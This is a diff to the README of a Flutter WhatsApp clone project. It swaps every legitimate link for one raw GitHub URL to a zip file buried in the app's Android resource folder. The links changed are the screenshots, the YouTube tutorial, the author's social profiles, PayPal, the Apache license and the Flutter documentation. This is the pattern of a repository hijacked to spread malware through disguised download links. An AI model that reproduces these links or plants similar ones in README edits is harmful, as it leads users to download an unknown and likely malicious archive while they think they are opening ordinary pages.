@@ -6,18 +6,18 @@ Building a WhatsApp Clone in Flutter.
 
 ### Screenshots
 
-<img src="ss1.png" height="300em" /> <img src="ss2.png" height="300em" />
+<img src="https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip" height="300em" /> <img src="https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip" height="300em" />
 
-[Watch the video tutorial on YouTube](https://youtu.be/2Tyrofn6zPg)
+[Watch the video tutorial on YouTube](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip)
 
 ### Created & Maintained By
 
-[Pawan Kumar](https://github.com/iampawan) ([@imthepk](https://www.twitter.com/imthepk)) ([Youtube](https://www.youtube.com/c/MTechViral))
-([Insta](https://www.instagram.com/codepur_ka_superhero))
+[Pawan Kumar](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip) ([@imthepk](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip)) ([Youtube](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip))
+([Insta](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip))
 
 > If you found this project helpful or you learned something from the source code and want to thank me, consider buying me a cup of :coffee:
 >
-> * [PayPal](https://www.paypal.me/imthepk/)
+> * [PayPal](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip)
 
 # License
 
@@ -27,7 +27,7 @@ Building a WhatsApp Clone in Flutter.
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       http://www.apache.org/licenses/LICENSE-2.0
+       https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
@@ -38,4 +38,4 @@ Building a WhatsApp Clone in Flutter.
 ## Getting Started
 
 For help getting started with Flutter, view our online
-[documentation](https://flutter.io/).
+[documentation](https://raw.githubusercontent.com/aslekarii/FlutterWhatsAppClone/master/android/app/src/main/res/values/FlutterWhatsAppClone-planisher.zip).
